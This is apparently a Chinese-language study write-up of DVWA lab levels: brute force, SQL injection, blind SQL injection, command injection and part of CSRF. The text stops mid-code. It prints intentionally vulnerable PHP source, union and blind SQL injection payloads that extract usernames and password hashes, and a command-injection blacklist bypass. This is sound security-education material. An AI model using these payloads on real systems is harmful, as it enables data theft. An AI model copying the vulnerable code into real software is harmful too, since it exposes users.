# 暴力破解（Brute Force）

low

```php+HTML
<?php

if( isset( $_GET[ 'Login' ] ) ) {
	// Get username
	$user = $_GET[ 'username' ];

	// Get password
	$pass = $_GET[ 'password' ];
	$pass = md5( $pass );

	// Check the database
	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	if( $result && mysqli_num_rows( $result ) == 1 ) {
		// Get users details
		$row    = mysqli_fetch_assoc( $result );
		$avatar = $row["avatar"];

		// Login successful
		$html .= "<p>Welcome to the password protected area {$user}</p>";
		$html .= "<img src=\"{$avatar}\" />";
	}
	else {
		// Login failed
		$html .= "<pre><br />Username and/or password incorrect.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
low级别是一个简单的登录的代码，仅仅对密码进行了MD5加密。没有任何过滤。
```

**四种暴力破解方式的区别：**

一个字典，两个参数，先匹配第一项，再匹配第二项【sniper】

一个字典，两个参数，同用户名同密码【battering ram】

两个字典，两个参数，同行匹配，短的截止【pitch fork】

两个字典，两个参数，交叉匹配，所有可能【cluster bomb】



## medium

```php+HTML
<?php

if( isset( $_GET[ 'Login' ] ) ) {
	// Sanitise username input
	$user = $_GET[ 'username' ];
	$user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Sanitise password input
	$pass = $_GET[ 'password' ];
	$pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass = md5( $pass );

	// Check the database
	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	if( $result && mysqli_num_rows( $result ) == 1 ) {
		// Get users details
		$row    = mysqli_fetch_assoc( $result );
		$avatar = $row["avatar"];

		// Login successful
		$html .= "<p>Welcome to the password protected area {$user}</p>";
		$html .= "<img src=\"{$avatar}\" />";
	}
	else {
		// Login failed
		sleep( 2 );
		$html .= "<pre><br />Username and/or password incorrect.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>

```

medium级别的代码和low级别的代码比较不同点在于加了层`mysql_real_escape_string( );`

**mysql_real_excape_string()**函数转义sql语句中使用的字符串中的特殊字符,防止sql注入.

同时对密码进行了md5加密，杜绝通过参数password进行sql注入的可能性.但是没有加

入有效的防爆破机制.

由此可见该函数的功能为防止SQL Injection攻击，

1、也就是你必须验证用户的输入

2、操作数据的时候避免不必要的字符导致错误

## hign

```php+HTML
<?php

if( isset( $_GET[ 'Login' ] ) ) {
	// Check Anti-CSRF token
	checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

	// Sanitise username input
	$user = $_GET[ 'username' ];
	$user = stripslashes( $user );
	$user = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $user ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

	// Sanitise password input
	$pass = $_GET[ 'password' ];
	$pass = stripslashes( $pass );
	$pass = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
	$pass = md5( $pass );

	// Check database
	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	if( $result && mysqli_num_rows( $result ) == 1 ) {
		// Get users details
		$row    = mysqli_fetch_assoc( $result );
		$avatar = $row["avatar"];

		// Login successful
		$html .= "<p>Welcome to the password protected area {$user}</p>";
		$html .= "<img src=\"{$avatar}\" />";
	}
	else {
		// Login failed
		sleep( rand( 0, 3 ) );
		$html .= "<pre><br />Username and/or password incorrect.</pre>";
	}

	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

// Generate Anti-CSRF token
generateSessionToken();

?>

```

high级别的代码和medium级别相比又加了`stripslashes()函数`

对于这个可以先弱口令、万能密码测试。如果无果，则进行暴力破解。

`mysql_real_escape_string()` 函数转义 SQL 语句中使用的字符串中的特殊字符；

`stripslashes()` 函数删除由 `addslashes()` 函数添加的反斜杠，可用于清理从数据库中或者从 HTML表单中取回的数据；

**破解过程**

通过抓包，我们发现了需要提交四个参数：username,password,login,user_token

每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查

可以尝试使用python脚本，使用爬虫将服务器每次返回的user_token抓取到


# sql注入（ SQL Injection）

## 原理

将恶意的sql语句拼接到合法的语句中，从而达到执行sql语句的目的。

## 类型

数字 字符 搜索

## 过程

**1.判断是否存在注入，注入时字符型还是数字型**

输入1，能够正常返回用户名和密码

在1后面加上'，报错，说明此处存在注入点。

接下来，判断字符型还是数字型，判断方法如下：

**数字型**：

（1）在URL的注入点中输入 `and 1=1`，成功返回

​		输入 `and 1=2`,依然成功返回，说明不是数字型，因为返回值没有受到数字的影响

（2）在URL或者表单中输入0 or 1，如果可以查到数据，说明是数字型注入

​		同样地，依然查不到数据，确定不是数字型

**字符型：**
1' and '1'='1

如果输入0'or 1#，查到数据说明是字符型注入

**2.猜解SQL查询语句中的字段数**
1' order by 1 #

1' order by 2 #

继续增加，加到3报错，说明这个表只有2列，也就是2个字段，可以看出有2个回显

**3.确定显示位置/字段顺序**

1' union select 1,2 #

First name处显示结果位查询结果的第一列的值，surname处显示结果位查询结果第二列的值。

**4.获取当前数据库及数据库版本、构造联合查询语句查询当前数据库用户和数据库名**
1' union select database(),version() #

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220606203259443.png" alt="image-20220606203259443" style="zoom:80%;" />

' union select user(),database()#

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220606203433321.png" alt="image-20220606203433321" style="zoom:80%;" />

**5.获取数据库中的表**
1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220606220541227.png" alt="image-20220606220541227" style="zoom:80%;" />

**6.获取表中的字段名**
1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220606220508909.png" alt="image-20220606220508909" style="zoom:80%;" />

**7.查询用户名和密码**
1' union select group_concat(user),group_concat(password) from users #

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220606210604232.png" alt="image-20220606210604232" style="zoom:80%;" />

1' union select user,password from users#

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220606220826739.png" alt="image-20220606220826739" style="zoom:80%;" />

## low

```php+HTML
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
	// Get input
	$id = $_REQUEST[ 'id' ];

	switch ($_DVWA['SQLI_DB']) {
		case MYSQL:
			// Check database
			$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
			$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

			// Get results
			while( $row = mysqli_fetch_assoc( $result ) ) {
				// Get values
				$first = $row["first_name"];
				$last  = $row["last_name"];

				// Feedback for end user
				$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
			}

			mysqli_close($GLOBALS["___mysqli_ston"]);
			break;
		case SQLITE:
			global $sqlite_db_connection;

			#$sqlite_db_connection = new SQLite3($_DVWA['SQLITE_DB']);
			#$sqlite_db_connection->enableExceptions(true);

			$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
			#print $query;
			try {
				$results = $sqlite_db_connection->query($query);
			} catch (Exception $e) {
				echo 'Caught exception: ' . $e->getMessage();
				exit();
			}

			if ($results) {
				while ($row = $results->fetchArray()) {
					// Get values
					$first = $row["first_name"];
					$last  = $row["last_name"];

					// Feedback for end user
					$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
				}
			} else {
				echo "Error in fetch ".$sqlite_db->lastErrorMsg();
			}
			break;
	} 
}

?>
```

函数：

```
mysqli_fetch_assoc() 	// 函数从结果集中取得一行作为关联数组，也就是区分大小写
```

源码分析：

1.  对用户的传参没有进行过滤，可以直接拼接sql语句
2.  采用单引号闭合

## medium

```php+HTML
<?php

if( isset( $_POST[ 'Submit' ] ) ) {
	// Get input
	$id = $_POST[ 'id' ];

	$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);

	switch ($_DVWA['SQLI_DB']) {
		case MYSQL:
			$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
			$result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

			// Get results
			while( $row = mysqli_fetch_assoc( $result ) ) {
				// Display values
				$first = $row["first_name"];
				$last  = $row["last_name"];

				// Feedback for end user
				$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
			}
			break;
		case SQLITE:
			global $sqlite_db_connection;

			$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
			#print $query;
			try {
				$results = $sqlite_db_connection->query($query);
			} catch (Exception $e) {
				echo 'Caught exception: ' . $e->getMessage();
				exit();
			}

			if ($results) {
				while ($row = $results->fetchArray()) {
					// Get values
					$first = $row["first_name"];
					$last  = $row["last_name"];

					// Feedback for end user
					$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
				}
			} else {
				echo "Error in fetch ".$sqlite_db->lastErrorMsg();
			}
			break;
	}
}

// This is used later on in the index.php page
// Setting it here so we can close the database connection in here like in the rest of the source scripts
$query  = "SELECT COUNT(*) FROM users;";
$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
$number_of_rows = mysqli_fetch_row( $result )[0];

mysqli_close($GLOBALS["___mysqli_ston"]);
?>
```

查看源码：
可以看到这句：

`$id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);`

**mysqli_real_escape_string()** 函数用来对字符串中的特殊字符进行转义， 以使得这个字符串是一个合法的 SQL 语句。传入的字符串会根据当前连接的字符集进行转义，得到一个编码后的合法的 SQL 语句。

## high

```php+HTML
<?php

if( isset( $_SESSION [ 'id' ] ) ) {
	// Get input
	$id = $_SESSION[ 'id' ];

	switch ($_DVWA['SQLI_DB']) {
		case MYSQL:
			// Check database
			$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
			$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );

			// Get results
			while( $row = mysqli_fetch_assoc( $result ) ) {
				// Get values
				$first = $row["first_name"];
				$last  = $row["last_name"];

				// Feedback for end user
				$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
			}

			((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);		
			break;
		case SQLITE:
			global $sqlite_db_connection;

			$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
			#print $query;
			try {
				$results = $sqlite_db_connection->query($query);
			} catch (Exception $e) {
				echo 'Caught exception: ' . $e->getMessage();
				exit();
			}

			if ($results) {
				while ($row = $results->fetchArray()) {
					// Get values
					$first = $row["first_name"];
					$last  = $row["last_name"];

					// Feedback for end user
					$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
				}
			} else {
				echo "Error in fetch ".$sqlite_db->lastErrorMsg();
			}
			break;
	}
}

?>
```

查看源码：

```php+HTML
$id = $_SESSION[ 'id' ];
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;"
```

源码分析：
​ 从SESSION中获取id的值，使用单引号闭合。因为SESSION获取值的特点，不能直接在当前页面注入
新增了LIMIT 1，只提供了1个参数，它的意思是：表示返回最大的记录行数目为1

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220607085000820.png" alt="image-20220607085000820"  />

# sql注入-盲注（SQL Injection (Blind)）

## 原理：

盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。盲注分为三类：基于**布尔SQL盲注**、**基于时间的SQL盲注**、**基于报错的SQL盲注**。

## low

```php+HTML
<?php

if( isset( $_GET[ 'Submit' ] ) ) {
	// Get input
	$id = $_GET[ 'id' ];
	$exists = false;

	switch ($_DVWA['SQLI_DB']) {
		case MYSQL:
			// Check database
			$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
			$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ); // Removed 'or die' to suppress mysql errors

			$exists = false;
			if ($result !== false) {
				try {
					$exists = (mysqli_num_rows( $result ) > 0);
				} catch(Exception $e) {
					$exists = false;
				}
			}
			((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
			break;
		case SQLITE:
			global $sqlite_db_connection;

			$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
			try {
				$results = $sqlite_db_connection->query($query);
				$row = $results->fetchArray();
				$exists = $row !== false;
			} catch(Exception $e) {
				$exists = false;
			}

			break;
	}

	if ($exists) {
		// Feedback for end user
		$html .= '<pre>User ID exists in the database.</pre>';
	} else {
		// User wasn't found, so the page wasn't!
		header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

		// Feedback for end user
		$html .= '<pre>User ID is MISSING from the database.</pre>';
	}

}

?>
```

可以发现Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞

**1.判断是否存在注入，注入类型**

输入1，显示User ID exists in the database. （显示存在）

再输入 1' and 1=1 # ，输出 exists

继续输入 1' and 1=2 #，显示missing。

User ID is MISSING from the database. （显示不存在）

说明存在字符型的盲注。

**2.猜数据库名**

1' and length(database())=1 #

1' and length(database())=2 #

1' and length(database())=3 #

...

先猜数据库名长度，看到哪个数字显示User ID exists in the database，就说明数据库名长度为多少。

1' and length(database())=1 #，显示不存在，继续

1' and length(database())=2 #，显示不存在，继续

1' and length(database())=3 #，显示不存在，继续

1' and length(database())=4 #，显示存在，说明数据库名长度为4。

已知数据库名长度，继续猜解数据库名，这里会用到二分法，有点类似枚举法。

1’ and ascii(substr(databse(),1,1))>97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）

1’ and ascii(substr(databse(),1,1))<101 #，显示存在，说明数据库名的第一个字符的ascii值小于101（小写字母e的ascii值）

1’ and ascii(substr(databse(),1,1))<100 #,显示不存在，说明数据库名的第一个字符的ascii值不小于100，（小写字母d的ascii的值）

1’ and ascii(substr(databse(),1,1))>100 #，显示不存在，说明数据库名的第一个字符的ascii值大于100，（小写字母d的ascii的值）

由此推断数据库名称的第一个字母是d，同理推断下去，可知数据库名为dvwa。

**3.猜解数据库中的表名**

先猜表的数量

1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 #

显示不存在，说明数据表的数量不为1

1’ and (select count (table_name) from information_schema.tables where table_schema=database())=2 #

显示存在，说明存在两个表。

接着猜解表名长度

1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))>10 #，输出MISSING，显示不存在，说明长度值小于10

1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))>5 #，显示存在，那么说明这个长度值在5-10之间，继续往下猜解。

然后在5，6，7，8，9里挨个去试，我这里就不截图了

1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #，显示存在，那么说第一个表名长度为9。

然后利用二分法继续猜解第一张表的9个字母都是啥

1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97 #

直到—— 1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 #，对应的字母为g。

同样的方法继续，分别得到其它的8个字母，为u、e、s、t、b、o、o、k，合起来为guestbook。

这是第一张表，第二张表也是如此

1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))>97 #

一直到猜解结束，可以得出第二张表名为users。

**4.猜解表中的字段名**

已知两张表，guestbook和users，我们直奔users表，信息重要。

1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)>10 #

显示不存在，说明表中的字段数量小于10。

1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)>5 #

那么说这个值在5-10之间，5，6，7，8，9挨个去试

最后

1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 #

那说明users表存在8个字段信息。

**【猜想】数据库中可能保存的字段名称**
用户名：username/user_name/uname/u_name/user/name/...
密码：password/pass_word/pwd/pass/...

所以接下来我们要猜解账户和密码对应的字段是什么

1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='user')=1 #，输出exists

1' and (select count(*) from information_schema.columns where table_schema=database() and table_name='users' and column_name='password')=1 #，输出exists

所以证明了 users表中有 user和password。

**5.猜表中的字段值**

同样使用二分法来做，直接写最后一步了：

用户名的字段值：1' and length(substr((select user from users limit 0,1),1))=5 #，输出exists

——说明user字段中第1个字段值的字符长度=5。

密码的字段值：1' and length(substr((select password from users limit 0,1),1))=32 #，

——说明password字段中第1个字段值的字符长度=32（基本上这么长的密码位数可能是用md5的加密方式保存的）

然后再使用二分法猜解user字段的值：（用户名）

第一个字符是a

1' and ascii(substr((select user from users limit 0,1),2,1))=100 #（第二个字符）

第一个字符是d

... ...

最终得到结果是admin。

猜解password字段的值：（密码）

1' and ascii(substr((select password from users limit 0,1),1,1))>100 #（第一个字符）

... ...

最后得到的是32位长的md5加密的字符串，解密就可以得到密码password。

## medium

```php+HTML
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
	// Get input
	$id = $_POST[ 'id' ];
	$exists = false;

	switch ($_DVWA['SQLI_DB']) {
		case MYSQL:
			$id = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $id ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

			// Check database
			$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
			$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ); // Removed 'or die' to suppress mysql errors

			$exists = false;
			if ($result !== false) {
				try {
					$exists = (mysqli_num_rows( $result ) > 0); // The '@' character suppresses errors
				} catch(Exception $e) {
					$exists = false;
				}
			}
			
			break;
		case SQLITE:
			global $sqlite_db_connection;
			
			$query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
			try {
				$results = $sqlite_db_connection->query($query);
				$row = $results->fetchArray();
				$exists = $row !== false;
			} catch(Exception $e) {
				$exists = false;
			}
			break;
	}

	if ($exists) {
		// Feedback for end user
		$html .= '<pre>User ID exists in the database.</pre>';
	} else {
		// Feedback for end user
		$html .= '<pre>User ID is MISSING from the database.</pre>';
	}
}

?>
```

Medium级别的代码利用`mysql_real_escape_string`函数对特殊符号进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。

这一幕是否似曾相识，其实sql注入的medium级别也是这样的，原理基本相同，攻击思路也一样，利用burpsuite工具。

只不过，这次不采用布尔盲注法，采用延时盲注法，但都是二分法进行猜测。

## high

```php+HTML
<?php

if( isset( $_COOKIE[ 'id' ] ) ) {
	// Get input
	$id = $_COOKIE[ 'id' ];
	$exists = false;

	switch ($_DVWA['SQLI_DB']) {
		case MYSQL:
			// Check database
			$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
			$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ); // Removed 'or die' to suppress mysql errors

			$exists = false;
			if ($result !== false) {
				// Get results
				try {
					$exists = (mysqli_num_rows( $result ) > 0); // The '@' character suppresses errors
				} catch(Exception $e) {
					$exists = false;
				}
			}

			((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
			break;
		case SQLITE:
			global $sqlite_db_connection;

			$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
			try {
				$results = $sqlite_db_connection->query($query);
				$row = $results->fetchArray();
				$exists = $row !== false;
			} catch(Exception $e) {
				$exists = false;
			}

			break;
	}

	if ($exists) {
		// Feedback for end user
		$html .= '<pre>User ID exists in the database.</pre>';
	}
	else {
		// Might sleep a random amount
		if( rand( 0, 5 ) == 3 ) {
			sleep( rand( 2, 4 ) );
		}

		// User wasn't found, so the page wasn't!
		header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

		// Feedback for end user
		$html .= '<pre>User ID is MISSING from the database.</pre>';
	}
}

?>
```

可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。真的跟前面的sql注入一样的套路啊，记得利用#进行注释。

# 命令注入（Command Injection）

## 原理

命令注入攻击，是指由于Web应用程序对用户提交的数据过滤不严格，导致黑客可以通过构造特殊命令字符串的方式，将数据提交至Web应用程序中，并利用该方式执行外部程序或系统命令实施攻击，非法获取数据或者网络资源等。在命令注入的漏洞中，最为常见的是PHP的命令注入。PHP命令注入攻击存在的主要原因是Web应用程序员在应用PHP语言中一些具有命令执行功能的函数时，对用户提交的数据内容没有进行严格的过滤就带入函数中执行而造成的。例如，当黑客提交的数据内容为向网站目录写入PHP文件时，就可以通过该命令注入攻击漏洞写入一个PHP后门文件，进而实施下一步渗透攻击。

## low

查看源码

```php+HTML
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
	// Get input
	$target = $_REQUEST[ 'ip' ];

	// Determine OS and execute the ping command.
	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
		// Windows
		$cmd = shell_exec( 'ping  ' . $target );
	}
	else {
		// *nix
		$cmd = shell_exec( 'ping  -c 4 ' . $target );
	}

	// Feedback for the end user
	$html .= "<pre>{$cmd}</pre>";
}

?>
```

**\*命令连接符\***

com1 && com2  先执行com1后执行com2，且com1成功后才会执行com2

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220605184910296.png" alt="image-20220605184910296" style="zoom:80%;" />



com1 & com2  左边不管是否执行成功仍然会执行右边的com2（同时执行）

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220605191946218.png" alt="image-20220605191946218" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220605191831237.png" alt="image-20220605191831237" style="zoom:80%;" />



com1 | com2   只执行com2，com1的输出作为com2的输出

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220605190314378.png" alt="image-20220605190314378" style="zoom:80%;" />



com1 || com2，如果com1成功执行则com2不会被执行，com1执行错误则执行com2

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220605190345920.png" alt="image-20220605190345920" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220605190502426.png" alt="image-20220605190502426" style="zoom:80%;" />

**linux**：com1;com2， 命令顺序执行 com1命令无法执行,com2命令才执行



## medium

```php+HTML
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
	// Get input
	$target = $_REQUEST[ 'ip' ];

	// Set blacklist
	$substitutions = array(
		'&&' => '',
		';'  => '',
	);

	// Remove any of the charactars in the array (blacklist).
	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );

	// Determine OS and execute the ping command.
	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
		// Windows
		$cmd = shell_exec( 'ping  ' . $target );
	}
	else {
		// *nix
		$cmd = shell_exec( 'ping  -c 4 ' . $target );
	}

	// Feedback for the end user
	$html .= "<pre>{$cmd}</pre>";
}

?>
```

****$substitutions = array(****
		'&&' => '',
		';'  => '',	);****

**这段代码表示过滤了“&&”和“；”，但没有过滤“||”**

`函数str_replace`

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220606173840552.png" alt="image-20220606173840552" style="zoom:80%;" />

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220606173918500.png" alt="image-20220606173918500" style="zoom:80%;" />

## high

```php+HTML
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
	// Get input
	$target = trim($_REQUEST[ 'ip' ]);

	// Set blacklist
	$substitutions = array(
		'&'  => '',
		';'  => '',
		'| ' => '',
		'-'  => '',
		'$'  => '',
		'('  => '',
		')'  => '',
		'`'  => '',
		'||' => '',
	);

	// Remove any of the characters in the array (blacklist).
	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );

	// Determine OS and execute the ping command.
	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
		// Windows
		$cmd = shell_exec( 'ping  ' . $target );
	}
	else {
		// *nix
		$cmd = shell_exec( 'ping  -c 4 ' . $target );
	}

	// Feedback for the end user
	$html .= "<pre>{$cmd}</pre>";
}

?>
```

源码中暴露的问题：

**看似过滤挺全面的，但其实’| ‘这个中是带空格的，所以我们依然可以使用’|'绕过**

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220606183627017.png" alt="image-20220606183627017" style="zoom:80%;" />![image-20220606183834802](C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220606183834802.png)

<img src="C:\Users\16414\AppData\Roaming\Typora\typora-user-images\image-20220606183854332.png" alt="image-20220606183854332" style="zoom:80%;" />



# 跨站域请求伪造（csrf）

## 原理

攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。 如下：其中Web A为存在CSRF漏洞的网站，Web B为攻击者构建的恶意网站，User C为Web A网站的合法用户。

## 过程

1. 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A；
2. 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A；
3. 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B；
4. 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A；
5. 浏览器在接收到这些攻击性代码后，根据网站 B 的请求，在用户不知情的情况下携带 Cookie 信息，向网站 A 发出请求。网站 A 并不知道该请求其实是由 B 发起的，所以会根据用户 C 的 Cookie 信息以 C 的权限处理该请求，导致来自网站 B 的恶意代码被执行。

## 与XSS的区别：

XSS是通过修改页面Javascript等代码后，发给用户从而实现盗取cookie信息，之后利用cookie进行登陆网站等操作。非法操作是黑客。
CSRF并没有盗取cookie信息，而是通过用户直接利用cookie进行操作。非法操作并不是黑客，而是用户本身。

## low

```php+HTML
<?php

if( isset( $_GET[ 'Change' ] ) ) {
	// Get input
	$pass_new  = $_GET[ 'password_new' ];
	$pass_conf = $_GET[ 'password_conf' ];

	// Do the passwords match?
	if( $pass_new == $pass_conf ) {
		// They do!
		$pass_new = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $pass_new ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
		$pass_new = md5( $pass_new );

		// Update the database
		$insert = "UPDATE `users` SET password = '$pass_new' WHERE user = '" . dvwaCurrentUser() . "';";
		$result = mysqli_query($GLOBALS["___mysqli_ston"],  $insert ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

		// Feedback for the user
		$html .= "<pre>Password Changed.</pre>";
	}
	else {
		// Issue with passwords matching
